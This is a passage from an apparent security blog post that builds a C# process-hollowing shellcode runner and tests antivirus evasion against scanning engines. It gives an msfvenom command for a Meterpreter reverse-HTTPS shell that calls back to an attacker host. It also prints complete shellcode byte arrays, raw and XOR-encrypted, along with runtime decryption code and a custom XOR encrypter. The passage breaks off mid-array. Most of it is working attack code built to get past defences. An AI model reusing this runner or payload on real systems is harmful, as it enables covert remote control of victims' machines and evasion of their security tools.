            ResumeThread(pi.hThread);
            //We now have all the pieces to create a suspended process, hollow out its original code, replace it with our shellcode, and subsequently execute it. 
```

*Bada bing bada boom*, we now have a working process hollowing shellcode runner.

Still with me? Okay, cool, now we get to the actual research, implementing antivirus evasion.

## The Journey Begins: Encrypting the Payload

To begin, let’s look at the initial process hollowing shellcode runner’s detection rate for a baseline comparison.

To test each version of the shellcode runner without distributing the findings, I used [KleenScan](https://kleenscan.com/index).

This service performs scan-time testing against 40 different antivirus engines, but most importantly, it doesn’t distribute.

Also, the PE file’s name will change in several of these screenshots. This is because I made numerous versions of the shellcode runner during testing. The date of the scan may also change, as I had to go back to get screenshots when writing this post.

So, how does the initial shellcode runner hold up?

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/baseline-results-742x1024.png)

Well, the answer is… not very well.

This leaves *plenty* of room for improvement.

The first addition that can be made is XOR encrypting our MSFVenom shellcode to hopefully bypass signature detection.

We will generate the new XOR encrypted payload with the following command:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key z -i 20 | tr -d 'nr' 
```

I chose to use the payload:

**windows/x64/meterpreter/reverse\_https**

Because this payload utilizes HTTPS for the network communication between the victim machine and the attacker machine.

Using HTTPS with port 443, we can better disguise our malicious network traffic by blending in with normal network traffic.

Additionally, the communication is, of course, encrypted with TLS.

This should help bypass network firewalls, egress filters, and packet/protocol inspection.

We then append the flags and arguments:

**–encrypt xor**

**–encrypt-key z**

**-i 20**

This will cause the outputted shellcode to be XOR encrypted, with the XOR encryption key set to the ASCII character “z”, and will iterate the encryption 20 times.

Lastly, to make things a little cleaner, I pipe the output to the “tr” command with the “-d” flag with the argument “nr”.

This eliminates any newlines or returns in the output, thus allowing us to be able to copy and paste the generated byte array as a single line.

With the XOR encrypted payload created, we will implement it into the C# shellcode runner:

```csharp
            // Generate XOR shellcode with MSFVenom: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key z -i 20 | tr -d 'nr'
            byte[] buf = new byte[809] { 0x86, 0x32, 0xf9, 0x9e, 0x8a, 0x92, 0xb6, 0x7a, 0x7a, 0x7a, 0x3b, 0x2b, 0x3b, 0x2a, 0x28, 0x32, 0x4b, 0xa8, 0x2b, 0x1f, 0x32, 0xf1, 0x28, 0x1a, 0x2c, 0x32, 0xf1, 0x28, 0x62, 0x32, 0xf1, 0x28, 0x5a, 0x32, 0xf1, 0x08, 0x2a, 0x37, 0x4b, 0xb3, 0x32, 0x75, 0xcd, 0x30, 0x30, 0x32, 0x4b, 0xba, 0xd6, 0x46, 0x1b, 0x06, 0x78, 0x56, 0x5a, 0x3b, 0xbb, 0xb3, 0x77, 0x3b, 0x7b, 0xbb, 0x98, 0x97, 0x28, 0x3b, 0x2b, 0x32, 0xf1, 0x28, 0x5a, 0xf1, 0x38, 0x46, 0x32, 0x7b, 0xaa, 0x1c, 0xfb, 0x02, 0x62, 0x71, 0x78, 0x75, 0xff, 0x08, 0x7a, 0x7a, 0x7a, 0xf1, 0xfa, 0xf2, 0x7a, 0x7a, 0x7a, 0x32, 0xff, 0xba, 0x0e, 0x1d, 0x32, 0x7b, 0xaa, 0x3e, 0xf1, 0x3a, 0x5a, 0xf1, 0x32, 0x62, 0x2a, 0x33, 0x7b, 0xaa, 0x99, 0x2c, 0x37, 0x4b, 0xb3, 0x32, 0x85, 0xb3, 0x3b, 0xf1, 0x4e, 0xf2, 0x32, 0x7b, 0xac, 0x32, 0x4b, 0xba, 0xd6, 0x3b, 0xbb, 0xb3, 0x77, 0x3b, 0x7b, 0xbb, 0x42, 0x9a, 0x0f, 0x8b, 0x36, 0x79, 0x36, 0x5e, 0x72, 0x3f, 0x43, 0xab, 0x0f, 0xa2, 0x22, 0x3e, 0xf1, 0x3a, 0x5e, 0x33, 0x7b, 0xaa, 0x1c, 0x3b, 0xf1, 0x76, 0x32, 0x3e, 0xf1, 0x3a, 0x66, 0x33, 0x7b, 0xaa, 0x3b, 0xf1, 0x7e, 0xf2, 0x32, 0x7b, 0xaa, 0x3b, 0x22, 0x3b, 0x22, 0x24, 0x23, 0x20, 0x3b, 0x22, 0x3b, 0x23, 0x3b, 0x20, 0x32, 0xf9, 0x96, 0x5a, 0x3b, 0x28, 0x85, 0x9a, 0x22, 0x3b, 0x23, 0x20, 0x32, 0xf1, 0x68, 0x93, 0x31, 0x85, 0x85, 0x85, 0x27, 0x32, 0x4b, 0xa1, 0x29, 0x33, 0xc4, 0x0d, 0x13, 0x14, 0x13, 0x14, 0x1f, 0x0e, 0x7a, 0x3b, 0x2c, 0x32, 0xf3, 0x9b, 0x33, 0xbd, 0xb8, 0x36, 0x0d, 0x5c, 0x7d, 0x85, 0xaf, 0x29, 0x29, 0x32, 0xf3, 0x9b, 0x29, 0x20, 0x37, 0x4b, 0xba, 0x37, 0x4b, 0xb3, 0x29, 0x29, 0x33, 0xc0, 0x40, 0x2c, 0x03, 0xdd, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x92, 0x74, 0x7a, 0x7a, 0x7a, 0x4b, 0x43, 0x48, 0x54, 0x4b, 0x4c, 0x42, 0x54, 0x4b, 0x54, 0x48, 0x4a, 0x43, 0x7a, 0x20, 0x32, 0xf3, 0xbb, 0x33, 0xbd, 0xba, 0xc1, 0x7b, 0x7a, 0x7a, 0x37, 0x4b, 0xb3, 0x29, 0x29, 0x10, 0x79, 0x29, 0x33, 0xc0, 0x2d, 0xf3, 0xe5, 0xbc, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x92, 0x85, 0x7a, 0x7a, 0x7a, 0x55, 0x4d, 0x20, 0x3b, 0x4e, 0x10, 0x03, 0x32, 0x00, 0x4d, 0x37, 0x22, 0x28, 0x37, 0x34, 0x3b, 0x03, 0x0e, 0x39, 0x0c, 0x2d, 0x1b, 0x2b, 0x36, 0x4a, 0x39, 0x2d, 0x0f, 0x4b, 0x2a, 0x4e, 0x2a, 0x31, 0x42, 0x31, 0x15, 0x43, 0x28, 0x2a, 0x4b, 0x48, 0x4a, 0x22, 0x43, 0x19, 0x3f, 0x2f, 0x2c, 0x20, 0x3d, 0x09, 0x08, 0x19, 0x0c, 0x33, 0x17, 0x57, 0x30, 0x03, 0x0c, 0x4a, 0x38, 0x20, 0x0c, 0x20, 0x32, 0x34, 0x43, 0x3c, 0x4c, 0x2d, 0x35, 0x1b, 0x2d, 0x22, 0x4e, 0x10, 0x13, 0x32, 0x08, 0x1c, 0x02, 0x09, 0x3e, 0x36, 0x13, 0x4b, 0x02, 0x1d, 0x36, 0x3c, 0x0b, 0x23, 0x48, 0x0d, 0x42, 0x2c, 0x2d, 0x35, 0x31, 0x37, 0x39, 0x48, 0x0f, 0x10, 0x35, 0x3b, 0x4f, 0x22, 0x30, 0x2a, 0x0e, 0x57, 0x3d, 0x0c, 0x57, 0x13, 0x2d, 0x02, 0x02, 0x2f, 0x14, 0x19, 0x14, 0x38, 0x48, 0x34, 0x4d, 0x4a, 0x42, 0x42, 0x18, 0x18, 0x34, 0x16, 0x17, 0x10, 0x03, 0x2a, 0x32, 0x37, 0x0d, 0x22, 0x49, 0x18, 0x36, 0x12, 0x13, 0x13, 0x49, 0x4a, 0x34, 0x22, 0x2e, 0x2e, 0x09, 0x1f, 0x00, 0x22, 0x4a, 0x34, 0x0b, 0x34, 0x2d, 0x36, 0x3e, 0x11, 0x1d, 0x15, 0x22, 0x0c, 0x19, 0x3c, 0x30, 0x2c, 0x4c, 0x38, 0x0e, 0x39, 0x4e, 0x1b, 0x4b, 0x1c, 0x03, 0x23, 0x3f, 0x3b, 0x16, 0x48, 0x34, 0x38, 0x15, 0x4d, 0x4c, 0x32, 0x25, 0x1b, 0x35, 0x12, 0x12, 0x1e, 0x22, 0x2b, 0x1c, 0x13, 0x4b, 0x22, 0x3e, 0x1b, 0x36, 0x3c, 0x1d, 0x34, 0x0c, 0x17, 0x29, 0x1c, 0x31, 0x43, 0x25, 0x0c, 0x38, 0x49, 0x0b, 0x37, 0x2b, 0x29, 0x17, 0x08, 0x11, 0x3f, 0x42, 0x2e, 0x2d, 0x1d, 0x49, 0x0b, 0x0a, 0x16, 0x0d, 0x0a, 0x29, 0x1f, 0x0d, 0x19, 0x36, 0x4d, 0x3b, 0x0f, 0x20, 0x1c, 0x00, 0x15, 0x43, 0x7a, 0x32, 0xf3, 0xbb, 0x29, 0x20, 0x3b, 0x22, 0x37, 0x4b, 0xb3, 0x29, 0x32, 0xc2, 0x7a, 0x48, 0xd2, 0xfe, 0x7a, 0x7a, 0x7a, 0x7a, 0x2a, 0x29, 0x29, 0x33, 0xbd, 0xb8, 0x91, 0x2f, 0x54, 0x41, 0x85, 0xaf, 0x32, 0xf3, 0xbc, 0x10, 0x70, 0x25, 0x32, 0xf3, 0x8b, 0x10, 0x65, 0x20, 0x28, 0x12, 0xfa, 0x49, 0x7a, 0x7a, 0x33, 0xf3, 0x9a, 0x10, 0x7e, 0x3b, 0x23, 0x33, 0xc0, 0x0f, 0x3c, 0xe4, 0xfc, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x37, 0x4b, 0xba, 0x29, 0x20, 0x32, 0xf3, 0x8b, 0x37, 0x4b, 0xb3, 0x37, 0x4b, 0xb3, 0x29, 0x29, 0x33, 0xbd, 0xb8, 0x57, 0x7c, 0x62, 0x01, 0x85, 0xaf, 0xff, 0xba, 0x0f, 0x65, 0x32, 0xbd, 0xbb, 0xf2, 0x69, 0x7a, 0x7a, 0x33, 0xc0, 0x3e, 0x8a, 0x4f, 0x9a, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x32, 0x85, 0xb5, 0x0e, 0x78, 0x91, 0xd0, 0x92, 0x2f, 0x7a, 0x7a, 0x7a, 0x29, 0x23, 0x10, 0x3a, 0x20, 0x33, 0xf3, 0xab, 0xbb, 0x98, 0x6a, 0x33, 0xbd, 0xba, 0x7a, 0x6a, 0x7a, 0x7a, 0x33, 0xc0, 0x22, 0xde, 0x29, 0x9f, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x32, 0xe9, 0x29, 0x29, 0x32, 0xf3, 0x9d, 0x32, 0xf3, 0x8b, 0x32, 0xf3, 0xa0, 0x33, 0xbd, 0xba, 0x7a, 0x5a, 0x7a, 0x7a, 0x33, 0xf3, 0x83, 0x33, 0xc0, 0x68, 0xec, 0xf3, 0x98, 0x7a, 0x7a, 0x7a, 0x7a, 0x85, 0xaf, 0x32, 0xf9, 0xbe, 0x5a, 0xff, 0xba, 0x0e, 0xc8, 0x1c, 0xf1, 0x7d, 0x32, 0x7b, 0xb9, 0xff, 0xba, 0x0f, 0xa8, 0x22, 0xb9, 0x22, 0x10, 0x7a, 0x23, 0xc1, 0x9a, 0x67, 0x50, 0x70, 0x3b, 0xf3, 0xa0, 0x85, 0xaf };
            // XOR decrypt, key is set to 'z'
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'z');
            } 
```

We also add a for loop to decrypt the XOR payload at runtime.

So, what are the results for this version?

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/msfvenom-xor-results-743x1024.png)

And.. there is no change in the detection rating.

This could possibly be improved by encrypting the payload with a custom XOR encrypter.

However, this is ultimately unnecessary, as you will see later in this post.

Just for fun, I will show the results of this regardless.

We can create another simple C# console app to do this.

```csharp
using System;
using System.Text;
//XOR Encrypter
namespace XorCrypt
{
    internal class Program
    {
        static void Main(string[] args)
        {
            //Payload C# byte array from MSFVENOM
            byte[] buf = new byte[676] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x4d, 0x31, 0xc9, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x8b, 0x48, 0x18, 0x50, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x4d, 0x31, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0x41, 0xc1, 0xc9, 0x0d, 0xac, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x41, 0x58, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x48, 0x31, 0xdb, 0x53, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x48, 0x89, 0xe1, 0x49, 0xc7, 0xc2, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x53, 0x53, 0x48, 0x89, 0xe1, 0x53, 0x5a, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x53, 0x53, 0x49, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0xe8, 0x0e, 0x00, 0x00, 0x00, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x2e, 0x32, 0x30, 0x39, 0x00, 0x5a, 0x48, 0x89, 0xc1, 0x49, 0xc7, 0xc0, 0xbb, 0x01, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x53, 0x53, 0x6a, 0x03, 0x53, 0x49, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0xe8, 0x7a, 0x00, 0x00, 0x00, 0x2f, 0x53, 0x57, 0x51, 0x75, 0x63, 0x71, 0x59, 0x35, 0x62, 0x30, 0x6f, 0x6d, 0x53, 0x79, 0x64, 0x4a, 0x51, 0x31, 0x41, 0x70, 0x64, 0x67, 0x47, 0x53, 0x77, 0x58, 0x69, 0x41, 0x62, 0x50, 0x50, 0x6a, 0x33, 0x48, 0x32, 0x32, 0x37, 0x48, 0x68, 0x49, 0x57, 0x41, 0x5a, 0x55, 0x57, 0x66, 0x69, 0x6f, 0x42, 0x36, 0x46, 0x74, 0x79, 0x47, 0x75, 0x4b, 0x2d, 0x51, 0x6e, 0x58, 0x4e, 0x44, 0x44, 0x69, 0x57, 0x79, 0x35, 0x61, 0x38, 0x76, 0x52, 0x4f, 0x48, 0x74, 0x57, 0x45, 0x64, 0x62, 0x58, 0x5f, 0x77, 0x45, 0x63, 0x54, 0x50, 0x43, 0x4d, 0x53, 0x59, 0x69, 0x30, 0x46, 0x62, 0x58, 0x47, 0x53, 0x50, 0x72, 0x65, 0x6a, 0x50, 0x4b, 0x52, 0x35, 0x75, 0x4e, 0x5f, 0x42, 0x57, 0x51, 0x59, 0x32, 0x76, 0x6f, 0x7a, 0x32, 0x54, 0x57, 0x4b, 0x78, 0x00, 0x48, 0x89, 0xc1, 0x53, 0x5a, 0x41, 0x58, 0x4d, 0x31, 0xc9, 0x53, 0x48, 0xb8, 0x00, 0x32, 0xa8, 0x84, 0x00, 0x00, 0x00, 0x00, 0x50, 0x53, 0x53, 0x49, 0xc7, 0xc2, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x6a, 0x1f, 0x5a, 0x52, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x6a, 0x04, 0x41, 0x59, 0x49, 0xba, 0x75, 0x46, 0x9e, 0x86, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x4d, 0x31, 0xc0, 0x53, 0x5a, 0x48, 0x89, 0xf1, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc9, 0x53, 0x53, 0x49, 0xc7, 0xc2, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x75, 0x1f, 0x48, 0xc7, 0xc1, 0x88, 0x13, 0x00, 0x00, 0x49, 0xba, 0x44, 0xf0, 0x35, 0xe0, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48, 0xff, 0xcf, 0x74, 0x02, 0xeb, 0xaa, 0xe8, 0x55, 0x00, 0x00, 0x00, 0x53, 0x59, 0x6a, 0x40, 0x5a, 0x49, 0x89, 0xd1, 0xc1, 0xe2, 0x10, 0x49, 0xc7, 0xc0, 0x00, 0x10, 0x00, 0x00, 0x49, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x49, 0xba, 0x12, 0x96, 0x89, 0xe2, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb2, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd2, 0x58, 0xc3, 0x58, 0x6a, 0x00, 0x59, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0x89, 0xda, 0xff, 0xd5 };
            //substitution key of 2, iterated through each byte value in the shellcode, and simply added 2 to its value. We performed a bitwise AND operation with 0xFF to keep the modified value within the 0-255 range (single byte) in case the increased byte value exceeds 0xFF.
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }
            //For us to be able to use the encrypted shellcode, we must print it to the console, which we can do by converting the byte array into a string with the StringBuilder class and its associated AppendFormat method. To obtain a string that has the same format as that generated by msfvenom, we'll use a format string
            StringBuilder hex = new StringBuilder(encoded.Length * 20);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }
            Console.WriteLine("The XOR payload is: " + hex.ToString());
        }
    }
} 
```

This will XOR encrypt the byte array using a hex key of “0xAA” and print the output to the console.

```solid
C:UsershackerDesktop>.XorCrypt.exe
The XOR payload is: 0x56, 0xe2, 0x29, 0x4e, 0x5a, 0x42, 0x66, 0xaa, 0xaa, 0xaa, 0xeb, 0xfb, 0xeb, 0xfa, 0xf8, 0xfb, 0xfc, 0xe2, 0x9b, 0x78, 0xcf, 0xe2, 0x21, 0xf8, 0xca, 0xe2, 0x21, 0xf8, 0xb2, 0xe2, 0x21, 0xf8, 0x8a, 0xe7, 0x9b, 0x63, 0xe2, 0x21, 0xd8, 0xfa, 0xe2, 0xa5, 0x1d, 0xe0, 0xe0, 0xe2, 0x9b, 0x6a, 0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x48, 0x47, 0xf8, 0xeb, 0xfb, 0xe2, 0x21, 0xf8, 0x8a, 0x21, 0xe8, 0x96, 0xe2, 0xab, 0x7a, 0xcc, 0x2b, 0xd2, 0xb2, 0xa1, 0xa8, 0xa5, 0x2f, 0xd8, 0xaa, 0xaa, 0xaa, 0x21, 0x2a, 0x22, 0xaa, 0xaa, 0xaa, 0xe2, 0x2f, 0x6a, 0xde, 0xcd, 0xe2, 0xab, 0x7a, 0x21, 0xe2, 0xb2, 0xfa, 0xee, 0x21, 0xea, 0x8a, 0xe3, 0xab, 0x7a, 0x49, 0xfc, 0xe2, 0x55, 0x63, 0xe7, 0x9b, 0x63, 0xeb, 0x21, 0x9e, 0x22, 0xe2, 0xab, 0x7c, 0xe2, 0x9b, 0x6a, 0xeb, 0x6b, 0x63, 0xa7, 0x06, 0xeb, 0xab, 0x6b, 0x92, 0x4a, 0xdf, 0x5b, 0xe6, 0xa9, 0xe6, 0x8e, 0xa2, 0xef, 0x93, 0x7b, 0xdf, 0x72, 0xf2, 0xee, 0x21, 0xea, 0x8e, 0xe3, 0xab, 0x7a, 0xcc, 0xeb, 0x21, 0xa6, 0xe2, 0xee, 0x21, 0xea, 0xb6, 0xe3, 0xab, 0x7a, 0xeb, 0x21, 0xae, 0x22, 0xeb, 0xf2, 0xe2, 0xab, 0x7a, 0xeb, 0xf2, 0xf4, 0xf3, 0xf0, 0xeb, 0xf2, 0xeb, 0xf3, 0xeb, 0xf0, 0xe2, 0x29, 0x46, 0x8a, 0xeb, 0xf8, 0x55, 0x4a, 0xf2, 0xeb, 0xf3, 0xf0, 0xe2, 0x21, 0xb8, 0x43, 0xe1, 0x55, 0x55, 0x55, 0xf7, 0xe2, 0x9b, 0x71, 0xf9, 0xe3, 0x14, 0xdd, 0xc3, 0xc4, 0xc3, 0xc4, 0xcf, 0xde, 0xaa, 0xeb, 0xfc, 0xe2, 0x23, 0x4b, 0xe3, 0x6d, 0x68, 0xe6, 0xdd, 0x8c, 0xad, 0x55, 0x7f, 0xf9, 0xf9, 0xe2, 0x23, 0x4b, 0xf9, 0xf0, 0xe7, 0x9b, 0x6a, 0xe7, 0x9b, 0x63, 0xf9, 0xf9, 0xe3, 0x10, 0x90, 0xfc, 0xd3, 0x0d, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0x42, 0xa4, 0xaa, 0xaa, 0xaa, 0x9b, 0x93, 0x98, 0x84, 0x9b, 0x9c, 0x92, 0x84, 0x9b, 0x84, 0x98, 0x9a, 0x93, 0xaa, 0xf0, 0xe2, 0x23, 0x6b, 0xe3, 0x6d, 0x6a, 0x11, 0xab, 0xaa, 0xaa, 0xe7, 0x9b, 0x63, 0xf9, 0xf9, 0xc0, 0xa9, 0xf9, 0xe3, 0x10, 0xfd, 0x23, 0x35, 0x6c, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0x42, 0xd0, 0xaa, 0xaa, 0xaa, 0x85, 0xf9, 0xfd, 0xfb, 0xdf, 0xc9, 0xdb, 0xf3, 0x9f, 0xc8, 0x9a, 0xc5, 0xc7, 0xf9, 0xd3, 0xce, 0xe0, 0xfb, 0x9b, 0xeb, 0xda, 0xce, 0xcd, 0xed, 0xf9, 0xdd, 0xf2, 0xc3, 0xeb, 0xc8, 0xfa, 0xfa, 0xc0, 0x99, 0xe2, 0x98, 0x98, 0x9d, 0xe2, 0xc2, 0xe3, 0xfd, 0xeb, 0xf0, 0xff, 0xfd, 0xcc, 0xc3, 0xc5, 0xe8, 0x9c, 0xec, 0xde, 0xd3, 0xed, 0xdf, 0xe1, 0x87, 0xfb, 0xc4, 0xf2, 0xe4, 0xee, 0xee, 0xc3, 0xfd, 0xd3, 0x9f, 0xcb, 0x92, 0xdc, 0xf8, 0xe5, 0xe2, 0xde, 0xfd, 0xef, 0xce, 0xc8, 0xf2, 0xf5, 0xdd, 0xef, 0xc9, 0xfe, 0xfa, 0xe9, 0xe7, 0xf9, 0xf3, 0xc3, 0x9a, 0xec, 0xc8, 0xf2, 0xed, 0xf9, 0xfa, 0xd8, 0xcf, 0xc0, 0xfa, 0xe1, 0xf8, 0x9f, 0xdf, 0xe4, 0xf5, 0xe8, 0xfd, 0xfb, 0xf3, 0x98, 0xdc, 0xc5, 0xd0, 0x98, 0xfe, 0xfd, 0xe1, 0xd2, 0xaa, 0xe2, 0x23, 0x6b, 0xf9, 0xf0, 0xeb, 0xf2, 0xe7, 0x9b, 0x63, 0xf9, 0xe2, 0x12, 0xaa, 0x98, 0x02, 0x2e, 0xaa, 0xaa, 0xaa, 0xaa, 0xfa, 0xf9, 0xf9, 0xe3, 0x6d, 0x68, 0x41, 0xff, 0x84, 0x91, 0x55, 0x7f, 0xe2, 0x23, 0x6c, 0xc0, 0xa0, 0xf5, 0xe2, 0x23, 0x5b, 0xc0, 0xb5, 0xf0, 0xf8, 0xc2, 0x2a, 0x99, 0xaa, 0xaa, 0xe3, 0x23, 0x4a, 0xc0, 0xae, 0xeb, 0xf3, 0xe3, 0x10, 0xdf, 0xec, 0x34, 0x2c, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0xe7, 0x9b, 0x6a, 0xf9, 0xf0, 0xe2, 0x23, 0x5b, 0xe7, 0x9b, 0x63, 0xe7, 0x9b, 0x63, 0xf9, 0xf9, 0xe3, 0x6d, 0x68, 0x87, 0xac, 0xb2, 0xd1, 0x55, 0x7f, 0x2f, 0x6a, 0xdf, 0xb5, 0xe2, 0x6d, 0x6b, 0x22, 0xb9, 0xaa, 0xaa, 0xe3, 0x10, 0xee, 0x5a, 0x9f, 0x4a, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0xe2, 0x55, 0x65, 0xde, 0xa8, 0x41, 0x00, 0x42, 0xff, 0xaa, 0xaa, 0xaa, 0xf9, 0xf3, 0xc0, 0xea, 0xf0, 0xe3, 0x23, 0x7b, 0x6b, 0x48, 0xba, 0xe3, 0x6d, 0x6a, 0xaa, 0xba, 0xaa, 0xaa, 0xe3, 0x10, 0xf2, 0x0e, 0xf9, 0x4f, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0xe2, 0x39, 0xf9, 0xf9, 0xe2, 0x23, 0x4d, 0xe2, 0x23, 0x5b, 0xe2, 0x23, 0x70, 0xe3, 0x6d, 0x6a, 0xaa, 0x8a, 0xaa, 0xaa, 0xe3, 0x23, 0x53, 0xe3, 0x10, 0xb8, 0x3c, 0x23, 0x48, 0xaa, 0xaa, 0xaa, 0xaa, 0x55, 0x7f, 0xe2, 0x29, 0x6e, 0x8a, 0x2f, 0x6a, 0xde, 0x18, 0xcc, 0x21, 0xad, 0xe2, 0xab, 0x69, 0x2f, 0x6a, 0xdf, 0x78, 0xf2, 0x69, 0xf2, 0xc0, 0xaa, 0xf3, 0x11, 0x4a, 0xb7, 0x80, 0xa0, 0xeb, 0x23, 0x70, 0x55, 0x7f 
```

![](http://loganelliottinfosec.com/wp-content/uploads/2023/10/XorCrypt-output.png)

Now, we will take the new custom XOR payload and put it within the shellcode runner, ensuring that we also update the decryption functionality:

```csharp
            byte[] buf = new byte[676] { 0x56, 0xe2, 0x29, 0x4e, 0x5a, 0x42, 0x66, 0xaa, 0xaa, 0xaa, 0xeb, 0xfb, 0xeb, 0xfa, 0xf8, 0xfb, 0xfc, 0xe2, 0x9b, 0x78, 0xcf, 0xe2, 0x21, 0xf8, 0xca, 0xe2, 0x21, 0xf8, 0xb2, 0xe2, 0x21, 0xf8, 0x8a, 0xe7, 0x9b, 0x63, 0xe2, 0x21, 0xd8, 0xfa, 0xe2, 0xa5, 0x1d, 0xe0, 0xe0, 0xe2, 0x9b, 0x6a, 0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x48, 0x47, 0xf8, 0xeb, 0xfb, 0xe2, 0x21, 0xf8, 0x8a, 0x21, 0xe8, 0x96, 0xe2, 0xab, 0x7a, 0xcc, 0x2b, 0xd2, 0xb2, 0xa1, 0xa8, 0xa5, 0x2f, 0xd8, 0xaa, 0xaa, 0xaa, 0x21, 0x2a, 0x22, 0xaa, 0xaa, 0xaa, 0xe2, 0x2f, 0x6a, 0xde, 0xcd, 0xe2, 0xab, 0x7a, 0x21, 0xe2, 0xb2, 0xfa, 0xee, 0x21, 0xea, 0x8a, 0xe3, 0xab, 0x7a, 0x49, 0xfc, 0xe2, 0x55, 0x63, 0xe7, 0x9b, 0x63, 0xeb, 0x21, 0x9e, 0x22, 0xe2, 0xab, 0x7c, 0xe2, 0x9b, 0x6a, 0xeb, 0x6b, 0x63, 0xa7, 0x06, 0xeb, 0xab, 0x6b, 0x92, 0x4a, 0xdf, 0x5b, 0xe6, 0xa9, 0xe6, 0x8e, 0xa2, 0xef, 0x93, 0x7b, 0xdf, 0x72, 0xf2, 0xee, 0x21, 0xea, 0x8e, 0xe3, 0xab, 0x7a, 0xcc, 0xeb, 0x21, 0xa6, 0xe2, 0xee, 0x21, 0xea, 0xb6, 0xe3, 0xab, 0x7a, 0xeb, 0x21, 0xae, 0x22, 0xeb, 0xf2, 0xe2, 0xab, 0x7a, 0xeb, 0xf2, 0xf4, 0xf3, 